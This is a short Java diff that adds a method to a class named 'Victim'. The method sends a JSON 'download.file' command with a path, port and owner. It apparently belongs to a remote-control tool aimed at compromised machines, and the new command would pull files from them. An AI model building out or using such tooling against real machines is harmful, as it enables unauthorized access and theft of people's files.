@@ -146,5 +146,14 @@ public class Victim {
         sendMessage(query);
     }
 
+    public void sendDownloadFile(String path, long port, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "download.file");
+        query.put("path", path);
+        query.put("port", port);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
 
 }
